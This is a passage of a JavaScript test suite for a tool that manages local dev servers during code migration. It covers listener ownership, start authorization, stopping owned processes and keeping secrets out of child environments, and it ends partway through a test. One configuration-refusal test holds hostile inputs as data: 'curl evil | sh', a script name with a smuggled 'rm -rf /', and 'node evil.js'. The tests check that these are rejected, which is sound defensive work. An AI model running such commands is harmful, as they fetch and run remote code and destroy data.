// The application runtime against real servers: real `npm run`, real listeners
// read through lsof, real signals. Only what Ubuntu cannot produce (another
// network namespace, Windows' listener rows) is injected.

import assert from "node:assert/strict";
import { execFile, spawn } from "node:child_process";
import { createHash } from "node:crypto";
import { lstat, mkdir, mkdtemp, readFile, readdir, realpath, rm, symlink, writeFile } from "node:fs/promises";
import http from "node:http";
import net from "node:net";
import os from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";

import {
  APP_RUNTIME_CONFIG,
  childEnvironment,
  getMigrationStatus,
  holdersOf,
  parseLsofListeners,
  parseNetstatListeners,
  runAppRuntime as runReal,
  runsProject,
} from "../../src/lifecycle/index.mjs";
import { parseValidateArguments } from "../../src/cli/validate-migration.mjs";
import { dirtyManifest } from "../../src/shared/index.mjs";
import { TARGET_DIRTY_SCOPE } from "../../src/slices/index.mjs";
import { createUnstampedRecord } from "../support/consumer-fixture.mjs";

const execFileAsync = promisify(execFile);
const CANARY = "amt-canary-7f3a91";
const OWN_NAMESPACE = process.platform === "linux" && /microsoft/i.test(os.release()) ? "wsl" : process.platform;

const scratch = [];
const running = new Set();
after(async () => {
  for (const pid of running) { try { process.kill(pid, "SIGKILL"); } catch { /* gone */ } }
  await Promise.all(scratch.map((directory) => rm(directory, { recursive: true, force: true })));
});

const freePort = () => new Promise((resolve) => {
  const server = net.createServer();
  server.listen(0, "127.0.0.1", () => {
    const { port } = server.address();
    server.close(() => resolve(port));
  });
});

const refused = (port) => new Promise((resolve) => {
  const socket = net.connect(port, "127.0.0.1");
  socket.once("connect", () => { socket.destroy(); resolve(false); });
  socket.once("error", () => resolve(true));
});

const until = async (condition, label) => {
  const deadline = Date.now() + 10_000;
  while (!(await condition())) {
    assert.ok(Date.now() < deadline, `timed out waiting for ${label}`);
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
};

/** A small HTTP application; every start appends a line to starts.log. */
const SERVER = (port, routes, marker) => `
import { appendFileSync, writeFileSync } from "node:fs";
import http from "node:http";
appendFileSync("starts.log", process.pid + "\\n");
console.log("fixture starting");
writeFileSync("env.json", JSON.stringify(process.env));
writeFileSync("argv.json", JSON.stringify(process.argv.slice(2)));
const routes = ${JSON.stringify(routes)};
http.createServer((request, response) => {
  if (request.url === "/public") { response.writeHead(200, { "set-cookie": "sid=${CANARY}" }); response.end("<title>${marker}</title> ${CANARY}"); return; }
  const route = routes[request.url];
  if (!route) { response.writeHead(404); response.end(); return; }
  response.writeHead(route.status, route.headers ?? {});
  response.end(route.body ?? "");
}).listen(${port}, "127.0.0.1");
`;

const SIGN_IN_REDIRECT = { "/private": { status: 307, headers: { location: `/login?token=${CANARY}` } } };

const writeProject = async (directory, port, { routes = SIGN_IN_REDIRECT, marker = "fixture-app", script = "node server.mjs" } = {}) => {
  await mkdir(directory, { recursive: true });
  await writeFile(path.join(directory, "server.mjs"), SERVER(port, routes, marker));
  await writeFile(path.join(directory, "package.json"), JSON.stringify({ name: "fixture", private: true, scripts: { dev: script } }));
  return directory;
};

const launch = async (directory, port) => {
  const child = spawn(process.execPath, ["server.mjs", `--session=${CANARY}`], { cwd: directory, stdio: "ignore", detached: true, env: { PATH: process.env.PATH } });
  child.unref();
  running.add(child.pid);
  await until(async () => !(await refused(port)), "the fixture server");
  return child;
};

/** A target root with a registry; `config` is what the operator would write. */
const workspace = async ({ applications, namespace = OWN_NAMESPACE, moduleName = "orders" }) => {
  const root = await realpath(await mkdtemp(path.join(os.tmpdir(), "amt-app-runtime-")));
  scratch.push(root);
  // The configuration is looked for inside the target's Git work tree only.
  await execFileAsync("git", ["init", "-q"], { cwd: root });
  const targetRoot = path.join(root, "target");
  const registryPath = path.join(targetRoot, ".agents/knowledge/migrations/registry.json");
  await mkdir(path.dirname(registryPath), { recursive: true });
  await writeFile(registryPath, JSON.stringify({
    version: 1,
    projects: { legacy: { root: "../../../../legacy" }, target: { root: "../../.." } },
    modules: { [moduleName]: { target: moduleName } },
  }));
  await mkdir(path.join(root, "legacy"), { recursive: true });
  const write = async (document) => {
    await mkdir(path.join(targetRoot, ".artifact-migration-tools"), { recursive: true });
    await writeFile(path.join(targetRoot, APP_RUNTIME_CONFIG), JSON.stringify(document));
  };
  if (applications) await write({ version: 1, namespace, applications: await applications(root) });
  // The operator's file is another account's; a test that does not ask otherwise stands that in.
  const runAppRuntime = (action, options = {}) => runReal({ registryPath, moduleName, action, ...options, system: { configAuthority: async () => null, ...options.system } });
  return { root, targetRoot, registryPath, write, runAppRuntime };
};

const application = (project, port, extra = {}) => ({
  origin: `http://127.0.0.1:${port}`,
  project,
  identity: { route: "/public", includes: "fixture-app" },
  ...extra,
});

/** LEGACY and TARGET are both required; TARGET is a second instance of the same shape. */
const twoApps = async (first, extra = {}, { routes } = {}) => {
  const port = await freePort();
  const sibling = await freePort();
  const space = await workspace({
    applications: async (root) => {
      await writeProject(path.join(root, "legacy-app"), port, { routes, ...first });
      await writeProject(path.join(root, "target-app"), sibling);
      return {
        LEGACY: application("../legacy-app", port, { protectedRoute: "/private", ...extra }),
        TARGET: application("../target-app", sibling),
      };
    },
  });
  const legacy = path.join(space.root, "legacy-app");
  const target = path.join(space.root, "target-app");
  return { ...space, port, sibling, legacy, target };
};

const row = (report, role) => report.applications.find((item) => item.role === role);

const starts = async (project) =>
  (await readFile(path.join(project, "starts.log"), "utf8").catch(() => "")).split("\n").filter(Boolean).length;

const NPM_START = { manager: "npm", script: "dev" };

/** WMI's stand-in on Ubuntu: a detached process holding no stdio of the engine. */
const createDetached = async (argv, cwd) => {
  const child = spawn(argv[0], argv.slice(1), { cwd, detached: true, stdio: "ignore" });
  child.unref();
  return child.pid;
};
const WIN32 = { platform: "win32", createDetached };

/** Empties a role's start log, so the next start alone decides what it holds. */
const logOf = (space, role) => {
  const file = path.join(space.targetRoot, ".artifact-migration-tools/app-runtime", `${role}.log`);
  return { clear: () => rm(file, { force: true }), size: async () => (await readFile(file).catch(() => "")).length };
};

test("an application already running in its project is reused, never started again", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "AUTH_REQUIRED");
  assert.equal(row(report, "TARGET").state, "READY");
  assert.equal(row(report, "LEGACY").reused, true);
  assert.equal(row(report, "LEGACY").started, false);
  assert.equal(await starts(space.legacy), 1);
  await assert.rejects(lstat(path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json")), { code: "ENOENT" });
});

test("a stopped application starts through its authorized script, once, and stop ends it", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const first = await space.runAppRuntime("ensure");
  assert.equal(row(first, "LEGACY").state, "AUTH_REQUIRED");
  assert.equal(row(first, "LEGACY").started, true);
  assert.match(row(first, "LEGACY").log, /^\.artifact-migration-tools\/app-runtime\/LEGACY\.log$/);
  assert.ok(await logOf(space, "LEGACY").size() > 0, "the started script's output reaches its log");

  const second = await space.runAppRuntime("ensure");
  assert.equal(row(second, "LEGACY").reused, true);
  assert.equal(row(second, "LEGACY").started, false);
  assert.equal(await starts(space.legacy), 1);

  const stopped = await space.runAppRuntime("stop");
  assert.equal(stopped.applications.find((item) => item.role === "LEGACY").stopped, true);
  await until(() => refused(space.port), "the owned server to stop");
  assert.equal(stopped.applications.find((item) => item.role === "TARGET").stopped, false);
  assert.equal(await refused(space.sibling), false, "stop must leave a process it did not start");
});

test("a started application whose protected route is not built yet stays running", async () => {
  const space = await twoApps({}, { start: NPM_START, startTimeoutMs: 1_500 }, { routes: { "/private": { status: 404 } } });
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "READY");
  assert.equal(row(report, "LEGACY").started, true);
  assert.equal(row(report, "LEGACY").failure, undefined);
  assert.equal(await refused(space.port), false);
  await space.runAppRuntime("stop");
});

test("a stopped application without authorization stays stopped", async () => {
  const space = await twoApps({});
  await launch(space.target, space.sibling);
  const report = await space.runAppRuntime("ensure");
  assert.equal(report.state, "RUNTIME_DOWN");
  assert.equal(row(report, "LEGACY").startAuthorized, false);
  assert.match(row(report, "LEGACY").reason, /authorizes no start/);
  assert.equal(await starts(space.legacy), 0);
});

test("the wrong application on the port is refused by marker and by process, and nothing starts", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const other = path.join(space.root, "other");
  await writeProject(other, space.port, { marker: "another-app" });
  await launch(other, space.port);
  const byMarker = await space.runAppRuntime("ensure");
  assert.equal(row(byMarker, "LEGACY").state, "WRONG_APP");
  assert.match(row(byMarker, "LEGACY").reason, /identity marker/);
  assert.equal(await starts(space.legacy), 0);

  // The dangerous one: an identical copy, the same HTTP answers, another deployment.
  const copyPort = await freePort();
  const copy = path.join(space.root, "production-copy");
  await writeProject(copy, copyPort);
  await launch(copy, copyPort);
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: application("../legacy-app", copyPort),
    TARGET: application("../target-app", space.sibling),
  } });
  const byProcess = await space.runAppRuntime("check");
  assert.equal(row(byProcess, "LEGACY").state, "WRONG_APP");
  assert.match(row(byProcess, "LEGACY").reason, /outside/);
});

test("sign-in answers are AUTH_REQUIRED, a served route is READY, an unavailable server is RUNTIME_DOWN", async () => {
  const cases = [
    [{ "/private": { status: 200, body: "dashboard" } }, "READY"],
    [{ "/private": { status: 401 } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 403 } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 302, headers: { location: "/sign-in?next=/private" } } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 302, headers: { location: "https://idp.example.test/oauth" } } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 200, body: '<form><input name="p" type="password"></form>' } }, "AUTH_REQUIRED"],
    [{ "/private": { status: 503 } }, "RUNTIME_DOWN"],
    [{ "/private": { status: 404 } }, "READY"], // up, route not built yet
    [{ "/private": { status: 302, headers: { location: "http://[malformed" } } }, "READY"],
  ];
  for (const [routes, expected] of cases) {
    const space = await twoApps({}, { start: NPM_START }, { routes });
    await launch(space.legacy, space.port);
    await launch(space.target, space.sibling);
    const report = await space.runAppRuntime("ensure");
    assert.equal(row(report, "LEGACY").state, expected, JSON.stringify(routes));
    assert.equal(await starts(space.legacy), 1, "an answering server is never started again");
  }
  const down = await twoApps({});
  const report = await down.runAppRuntime("check");
  assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN");
  assert.match(row(report, "LEGACY").reason, /nothing listens/);
});

test("a wrong network namespace probes and starts nothing", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await space.write({ version: 1, namespace: "win32-elsewhere", applications: {
    LEGACY: application("../legacy-app", space.port, { start: NPM_START }),
    TARGET: application("../target-app", space.sibling),
  } });
  const report = await space.runAppRuntime("ensure");
  assert.equal(report.state, "WRONG_NAMESPACE");
  assert.match(report.reason, /different machine/);
  assert.equal(await starts(space.legacy), 0);
});

test("an answer with no local process behind it, or a shadow on the other address, proves nothing", async () => {
  const space = await twoApps({});
  await launch(space.legacy, space.port);
  await launch(space.target, space.sibling);
  const injected = (listeners) => ({ namespace: OWN_NAMESPACE, listeners: async () => listeners, processStart: async () => null, killTree: async () => {} });

  // A forwarded port (wslrelay, docker-proxy of another user): HTTP answers, no listener here.
  const forwarded = await space.runAppRuntime("check", { system: injected([]) });
  assert.equal(row(forwarded, "LEGACY").state, "IDENTITY_UNPROVEN");
  const uninspectable = await space.runAppRuntime("check", { system: injected(null) });
  assert.equal(row(uninspectable, "LEGACY").state, "IDENTITY_UNPROVEN");
  const asked = [];
  const pm2App = async (pid) => { asked.push(pid); return "milla7-web"; };
  const shadow = await space.runAppRuntime("check", {
    system: { ...injected([{ address: "0.0.0.0", pid: 1, command: "node /srv/process-manager/fork.js", cwd: "/" }]), pm2App },
  });
  assert.equal(row(shadow, "LEGACY").state, "WRONG_APP");
  assert.match(row(shadow, "LEGACY").reason, /outside .*: PID 1; free the port with `kill 1`, or point LEGACY\.origin at this project's own port\.$/);
  assert.deepEqual(asked, [], "pm2 is asked only about a pm2 child, so no pm2 daemon is ever started");

  // The observed holder: a production copy that pm2 runs; its command line names only pm2's container.
  const pm2Child = { address: "0.0.0.0", pid: 11452, command: String.raw`node C:\Users\dev\AppData\Roaming\npm\node_modules\pm2\lib\ProcessContainerFork.js`, cwd: null };
  const named = await space.runAppRuntime("check", { system: { ...injected([pm2Child]), pm2App, platform: "win32" } });
  assert.equal(row(named, "LEGACY").state, "WRONG_APP");
  assert.match(row(named, "LEGACY").reason, /PID 11452 \(pm2 app "milla7-web"\); free the port with `pm2 stop milla7-web`/);
  const unnamed = await space.runAppRuntime("check", { system: { ...injected([pm2Child]), pm2App: async () => { throw new Error("no pm2"); }, platform: "win32" } });
  assert.match(row(unnamed, "LEGACY").reason, /PID 11452; free the port with `taskkill \/PID 11452`/, "naming the holder is best effort");
});

test("listener parsing and ownership hold the rows real hosts produced", () => {
  // Windows, as observed: a production copy shares IPv4 with the dual-stack
  // development server, on a host whose netstat speaks another language.
  const netstat = [
    "  Proto  Dirección local   Dirección remota  Estado  PID",
    "  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       22",
    "  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       11",
    "  TCP    0.0.0.0:30001          0.0.0.0:0              LISTENING       33",
    "  TCP    [::]:3000              [::]:0                 ESCUCHANDO      11",
    "  TCP    [::1]:3000             [::]:0                 ESCUCHANDO      44",
    "  TCP    127.0.0.1:3000         127.0.0.1:50000        ESTABLISHED     55",
    "  UDP    0.0.0.0:3000           *:*                                    66",
  ].join("\r\n");
  const rows = parseNetstatListeners(netstat, 3000);
  assert.deepEqual(rows, [{ address: "0.0.0.0", pid: 22 }, { address: "0.0.0.0", pid: 11 }, { address: "::", pid: 11 }, { address: "::1", pid: 44 }]);
  assert.deepEqual(holdersOf(rows, { address: "::1", family: 6 }).map((item) => item.pid), [11, 44]);
  assert.deepEqual(holdersOf(rows, { address: "127.0.0.1", family: 4 }).map((item) => item.pid), [22, 11]);
  const project = String.raw`C:\Users\dev\work\app`;
  assert.equal(runsProject({ command: String.raw`"C:\Program Files\nodejs\node.exe" C:\Users\dev\work\app\node_modules\next\dist\server\lib\start-server.js` }, project, "win32"), true);
  assert.equal(runsProject({ command: String.raw`node C:\Users\dev\AppData\Roaming\npm\node_modules\pm2\lib\ProcessContainerFork.js` }, project, "win32"), false);
  assert.equal(runsProject({ command: String.raw`node C:\Users\dev\work\app-v2\server.js` }, project, "win32"), false, "a sibling sharing the prefix is foreign");
  assert.equal(runsProject({ command: null }, project, "win32"), null);

  // A lone dual-stack `::` serves IPv4 as well.
  assert.deepEqual(holdersOf([{ address: "::", pid: 5 }], { address: "127.0.0.1", family: 4 }).map((item) => item.pid), [5]);
  // An address on another interface is not this loopback's holder.
  assert.deepEqual(holdersOf([{ address: "172.16.0.9", pid: 6 }], { address: "127.0.0.1", family: 4 }), []);

  assert.deepEqual(parseLsofListeners("p10\nf20\ntIPv6\nn*:3000\np11\nf21\ntIPv4\nn*:3000\np12\nf3\ntIPv6\nn[::1]:3000\nf4\ntIPv4\nn127.0.0.1:3000\n"), [
    { address: "::", pid: 10 }, { address: "0.0.0.0", pid: 11 }, { address: "::1", pid: 12 }, { address: "127.0.0.1", pid: 12 },
  ]);
  assert.equal(runsProject({ command: "node server.js", cwd: "/work/app/sub" }, "/work/app", "linux"), true);
  assert.equal(runsProject({ command: "node /work/app-v2/server.js", cwd: "/" }, "/work/app", "linux"), false);
  assert.equal(runsProject({ command: null, cwd: null }, "/work/app", "linux"), null);
});

test("a startup that never becomes ready is timed out and killed; a failing one is reported", async () => {
  const hanging = await twoApps({ script: 'node -e "setInterval(() => {}, 1000)"' }, { start: NPM_START, startTimeoutMs: 700 });
  await launch(hanging.target, hanging.sibling);
  const report = await hanging.runAppRuntime("ensure");
  assert.equal(row(report, "LEGACY").state, "RUNTIME_DOWN");
  assert.equal(row(report, "LEGACY").failure, "STARTUP_TIMEOUT");
  await assert.rejects(lstat(path.join(hanging.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json")), { code: "ENOENT" });
  const { stdout } = await execFileAsync("ps", ["-eo", "command"]);
  assert.ok(!stdout.split("\n").some((line) => line.startsWith("node -e setInterval")), "the timed-out tree must be gone");

  const failing = await twoApps({ script: 'node -e "process.exit(3)"' }, { start: NPM_START });
  await launch(failing.target, failing.sibling);
  const failed = await failing.runAppRuntime("ensure");
  assert.equal(row(failed, "LEGACY").failure, "STARTUP_FAILED");
  assert.match(row(failed, "LEGACY").reason, /exited \(3\)/);

  // win32 runs the shell under a node relay: the exit code and the output still come through.
  const log = logOf(failing, "LEGACY");
  await log.clear();
  const relayed = await failing.runAppRuntime("ensure", { system: WIN32 });
  assert.equal(row(relayed, "LEGACY").failure, "STARTUP_FAILED");
  assert.match(row(relayed, "LEGACY").reason, /exited \(3\)/);
  assert.ok(await log.size() > 0, "the failed start's output reaches its log");
});

test("win32 starts through a process the engine is not the parent of, so its caller returns at once", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  // A separate engine with piped stdio, as an agent host calls it; WMI's stand-in holds none of its handles.
  const engine = new URL("../../src/lifecycle/index.mjs", import.meta.url).href;
  const script = `import { spawn } from "node:child_process"; import { runAppRuntime } from ${JSON.stringify(engine)};
const calls = [];
const createDetached = async (argv, cwd) => { calls.push({ argv, cwd }); const child = spawn(argv[0], argv.slice(1), { cwd, detached: true, stdio: "ignore" }); child.unref(); return child.pid; };
const report = await runAppRuntime({ registryPath: process.argv[1], moduleName: "orders", action: "ensure", system: { platform: "win32", createDetached, configAuthority: async () => null } });
console.log(JSON.stringify({ report, calls }));`;
  const caller = spawn(process.execPath, ["--input-type=module", "-e", script, space.registryPath], { stdio: ["ignore", "pipe", "pipe"], env: { PATH: process.env.PATH, SESSION_TOKEN: CANARY } });
  let output = "";
  caller.stdout.on("data", (chunk) => { output += chunk; });
  caller.stderr.on("data", (chunk) => { output += chunk; });
  const exitedAt = new Promise((resolve) => caller.once("exit", () => resolve(Date.now())));
  await new Promise((resolve) => caller.once("close", resolve));
  assert.ok(Date.now() - await exitedAt < 2_000, "the caller's pipes close when the engine exits");
  const { report, calls } = JSON.parse(output);
  assert.equal(row(report, "LEGACY").started, true);
  assert.equal(await refused(space.port), false, "the started application outlives the engine");
  assert.ok(await logOf(space, "LEGACY").size() > 0, "the relay holds the log");
  assert.equal(calls.length, 1);
  assert.deepEqual(calls[0].argv.slice(0, 2), [process.execPath, "-e"]);
  assert.equal(calls[0].cwd, space.legacy);
  assert.ok(calls[0].argv.every((word) => !word.includes('"')), "every word survives quoting into one command line");
  const payload = JSON.parse(Buffer.from(calls[0].argv[3], "base64").toString("utf8"));
  assert.equal(payload.line, "npm run dev");
  assert.ok(!JSON.stringify(payload.env).includes(CANARY), "the relay passes on only the child environment");
  await space.runAppRuntime("stop");
  await until(() => refused(space.port), "the owned server to stop");
});

test("concurrent ensures start one process", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const reports = await Promise.all([space.runAppRuntime("ensure"), space.runAppRuntime("ensure"), space.runAppRuntime("ensure")]);
  assert.deepEqual(reports.map((report) => row(report, "LEGACY").state), ["AUTH_REQUIRED", "AUTH_REQUIRED", "AUTH_REQUIRED"]);
  assert.equal(reports.filter((report) => row(report, "LEGACY").started).length, 1);
  assert.equal(await starts(space.legacy), 1);
  await space.runAppRuntime("stop");
});

test("an ownership record does not outlive its process: a recycled PID is never killed", async () => {
  const space = await twoApps({});
  const bystander = await launch(space.legacy, space.port);
  const file = path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json");
  await mkdir(path.dirname(file), { recursive: true });
  await writeFile(file, JSON.stringify({ version: 1, role: "LEGACY", pid: bystander.pid, namespace: OWN_NAMESPACE, processStart: "a time this PID never started", origin: "x" }));
  const stopped = await space.runAppRuntime("stop");
  assert.equal(stopped.applications.find((item) => item.role === "LEGACY").stopped, false);
  assert.equal(await refused(space.port), false);
  await assert.rejects(lstat(file), { code: "ENOENT" });
});

test("stop from another namespace leaves the ownership record of a live process alone", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  await space.runAppRuntime("ensure");
  const file = path.join(space.targetRoot, ".artifact-migration-tools/app-runtime/LEGACY.json");
  const elsewhere = { namespace: "another", listeners: async () => [], processStart: async () => null, killTree: async () => assert.fail("must not kill") };
  const report = await space.runAppRuntime("stop", { system: elsewhere });
  assert.equal(report.applications.find((item) => item.role === "LEGACY").stopped, false);
  assert.equal((await lstat(file)).isFile(), true);
  await space.runAppRuntime("stop");
  await until(() => refused(space.port), "the owned server to stop");
});

test("a module with no browser work needs no application and no configuration", async () => {
  const nonvisual = await workspace({});
  const inventories = path.join(nonvisual.targetRoot, ".agents/knowledge/migrations/modules/orders/inventories");
  await mkdir(inventories, { recursive: true });
  await writeFile(path.join(inventories, "legacy.json"), JSON.stringify({ hasVisibleUi: false }));
  const statePath = path.join(inventories, "../state.json");
  // The template seeds that value, so it proves nothing until discovery has closed.
  await writeFile(statePath, JSON.stringify({ status: "ACTIVE", completedSteps: ["RESOLVE"] }));
  assert.equal((await nonvisual.runAppRuntime("check")).state, "CONFIGURATION_MISSING");
  await writeFile(statePath, JSON.stringify({ status: "ACTIVE", completedSteps: ["RESOLVE", "DISCOVER_LEGACY"] }));
  for (const action of ["check", "ensure"]) {
    const report = await nonvisual.runAppRuntime(action);
    assert.equal(report.state, "NOT_REQUIRED");
    assert.deepEqual(report.applications, []);
  }

  const complete = await workspace({});
  const module = path.join(complete.targetRoot, ".agents/knowledge/migrations/modules/orders");
  await mkdir(module, { recursive: true });
  await writeFile(path.join(module, "state.json"), JSON.stringify({ status: "COMPLETE" }));
  assert.equal((await complete.runAppRuntime("ensure")).state, "NOT_REQUIRED");
});

const treeDigest = async (root) => {
  const hash = createHash("sha256");
  for (const entry of (await readdir(root, { recursive: true, withFileTypes: true })).filter((item) => item.isFile()).map((item) => path.join(item.parentPath, item.name)).sort()) {
    hash.update(entry).update(await readFile(entry));
  }
  return hash.digest("hex");
};

test("an ACTIVE record is untouched by every action, status is unchanged, and it resumes once the runtime is corrected", async () => {
  const consumer = await createUnstampedRecord({ prefix: "amt-app-runtime-record-" });
  scratch.push(consumer.root);
  const options = { registryPath: consumer.registryPath, moduleName: "auth" };
  const port = await freePort();
  const sibling = await freePort();
  const legacy = await writeProject(path.join(consumer.root, "legacy-app"), port);
  const target = await writeProject(path.join(consumer.root, "target-app"), sibling);
  await mkdir(path.join(consumer.targetRoot, ".artifact-migration-tools"), { recursive: true });
  const configFile = path.join(consumer.targetRoot, APP_RUNTIME_CONFIG);
  const checkpoint = JSON.stringify(await getMigrationStatus(options));
  const notConfigured = await runReal({ ...options, action: "check" });
  assert.equal(notConfigured.state, "CONFIGURATION_MISSING");
  assert.equal(notConfigured.configPath, configFile);
  assert.ok(notConfigured.reason.includes(configFile), "the operator gets the absolute path");
  await assert.rejects(lstat(configFile), { code: "ENOENT" });
  assert.equal(JSON.stringify(await getMigrationStatus(options)), checkpoint);
  await writeFile(configFile, JSON.stringify({ version: 1, namespace: OWN_NAMESPACE, applications: {
    LEGACY: application("../legacy-app", port, { start: NPM_START }),
    TARGET: application("../target-app", sibling, { start: NPM_START }),
  } }));
  await execFileAsync("git", ["-C", consumer.root, "add", "-N", "legacy-app"]); // A dirty tree is no reason to refuse.

  // A consumer that does not ignore the directory must not see the file as slice drift.
  const dirty = await dirtyManifest(consumer.targetRoot, TARGET_DIRTY_SCOPE);
  assert.ok(!dirty.entries.some((entry) => entry.path === APP_RUNTIME_CONFIG), "the configuration is no slice's work");

  const record = await treeDigest(consumer.recordRoot);
  const whole = await treeDigest(consumer.targetRoot);
  const status = JSON.stringify(await getMigrationStatus(options));
  const down = await runReal({ ...options, action: "check" });
  assert.equal(down.state, "RUNTIME_DOWN");
  assert.equal(await treeDigest(consumer.targetRoot), whole, "check writes nothing at all");
  assert.equal(await starts(legacy), 0);

  const ready = await runReal({ ...options, action: "ensure", system: { configAuthority: async () => null } });
  assert.equal(ready.state, "READY");
  assert.equal(await treeDigest(consumer.recordRoot), record);
  assert.equal(JSON.stringify(await getMigrationStatus(options)), status, "status reads the same record and starts nothing");
  await runReal({ ...options, action: "stop" });
  await until(() => refused(port), "the owned server to stop");
  assert.equal(await treeDigest(consumer.recordRoot), record);
  assert.equal(await starts(target), 1);
});

test("no credential crosses the boundary: not from the environment, a response or a command line", async () => {
  process.env.APP_RUNTIME_TEST_SECRET = CANARY;
  try {
    assert.equal(childEnvironment({ PATH: "/bin", GITHUB_TOKEN: CANARY, ANTHROPIC_API_KEY: CANARY, DATABASE_URL: CANARY, PORT: "1" }).PATH, "/bin");
    assert.deepEqual(Object.keys(childEnvironment({ GITHUB_TOKEN: CANARY, ANTHROPIC_API_KEY: CANARY, DATABASE_URL: CANARY, PORT: "1" })), []);
    const space = await twoApps({}, { start: NPM_START });
    await launch(space.target, space.sibling);
    const started = await space.runAppRuntime("ensure");
    assert.equal(row(started, "LEGACY").started, true);
    const inherited = await readFile(path.join(space.legacy, "env.json"), "utf8");
    assert.ok(!inherited.includes(CANARY), "a started application must not inherit an ambient secret");
    const checked = await space.runAppRuntime("check");
    for (const report of [started, checked]) assert.ok(!JSON.stringify(report).includes(CANARY));
    for (const report of [started, checked]) {
      assert.ok(!Object.hasOwn(row(report, "LEGACY"), "body"));
      assert.ok(row(report, "LEGACY").listeners.every((listener) => Object.keys(listener).sort().join() === "address,pid"));
    }
    await space.runAppRuntime("stop");
  } finally {
    delete process.env.APP_RUNTIME_TEST_SECRET;
  }
});

test("configuration is the only authority, and it must be local and exact", async () => {
  const absent = await workspace({});
  const missing = await absent.runAppRuntime("ensure");
  assert.equal(missing.state, "CONFIGURATION_MISSING");
  assert.equal(missing.configFile, APP_RUNTIME_CONFIG);

  const space = await twoApps({}, { start: NPM_START });
  const legacy = (extra) => ({ LEGACY: application("../legacy-app", space.port, extra), TARGET: application("../target-app", space.sibling) });
  const refusals = [
    [legacy({ start: { command: "curl evil | sh" } }), /start must be exactly/],
    [legacy({ start: { manager: "sh", script: "dev" } }), /start must be exactly/],
    [legacy({ start: { manager: "npm", script: "dev; rm -rf /" } }), /start must be exactly/],
    [legacy({ startCommand: "node evil.js" }), /unsupported startCommand/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, origin: "http://172.17.0.2:3000" } }, /another network namespace/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, origin: "https://localhost:3000" } }, /must be exactly/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, project: "../absent" } }, /does not exist/],
    [{ LEGACY: legacy().LEGACY }, /missing TARGET/],
    [{ ...legacy(), STAGING: legacy().TARGET }, /unknown STAGING/],
    [{ ...legacy(), LEGACY: { ...legacy().LEGACY, identity: { route: "/public" } } }, /identity must be/],
  ];
  for (const [applications, reason] of refusals) {
    await space.write({ version: 1, namespace: OWN_NAMESPACE, applications });
    const report = await space.runAppRuntime("ensure");
    assert.equal(report.state, "CONFIGURATION_MISSING", String(reason));
    assert.match(report.reason, reason);
  }

  // A script the project does not declare is not started, whatever the file says.
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: legacy({ start: { manager: "npm", script: "not-declared" } }) });
  assert.equal((await space.runAppRuntime("ensure")).state, "CONFIGURATION_MISSING");
  assert.equal(await starts(space.legacy), 0);

  // A file that arrived with the repository is not the operator's.
  await space.write({ version: 1, namespace: OWN_NAMESPACE, applications: legacy({ start: NPM_START }) });
  await execFileAsync("git", ["init", "-q"], { cwd: space.targetRoot });
  await execFileAsync("git", ["add", "-f", APP_RUNTIME_CONFIG], { cwd: space.targetRoot });
  const tracked = await space.runAppRuntime("ensure");
  assert.equal(tracked.state, "CONFIGURATION_MISSING");
  assert.match(tracked.reason, /tracked by Git/);
  await rm(path.join(space.targetRoot, ".git"), { recursive: true, force: true });

  // Neither is a link to somewhere else.
  const elsewhere = path.join(space.root, "elsewhere.json");
  await writeFile(elsewhere, "{}");
  await rm(path.join(space.targetRoot, APP_RUNTIME_CONFIG));
  await symlink(elsewhere, path.join(space.targetRoot, APP_RUNTIME_CONFIG));
  assert.match((await space.runAppRuntime("ensure")).reason, /symlink/);
});

const sudo = (...args) => execFileAsync("sudo", ["-n", ...args]);
const NO_SUDO = await sudo("true").then(() => false, () => "needs passwordless sudo to hand the file to another account");

test("a file the agent's account can write, or owns, authorizes no start", async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const real = (action) => runReal({ registryPath: space.registryPath, moduleName: "orders", action });
  const report = await real("ensure");
  assert.equal(report.state, "RUNTIME_DOWN");
  assert.equal(row(report, "LEGACY").startAuthorized, false);
  assert.match(row(report, "LEGACY").reason, /owned by the account this engine runs as/);
  assert.equal(await starts(space.legacy), 0);
  // Read-only is not enough while this account owns it: it can make it writable again.
  await execFileAsync("chmod", ["444", path.join(space.targetRoot, APP_RUNTIME_CONFIG)]);
  assert.match(row(await real("ensure"), "LEGACY").reason, /owned by the account/);
  assert.equal(await starts(space.legacy), 0);
});

test("a file another account owns and this one cannot write authorizes the start", { skip: NO_SUDO }, async () => {
  const space = await twoApps({}, { start: NPM_START });
  await launch(space.target, space.sibling);
  const file = path.join(space.targetRoot, APP_RUNTIME_CONFIG);
  await sudo("chown", "root", file);
  await sudo("chmod", "644", file);
  try {
    const report = await runReal({ registryPath: space.registryPath, moduleName: "orders", action: "ensure" });
    assert.equal(row(report, "LEGACY").startAuthorized, true);
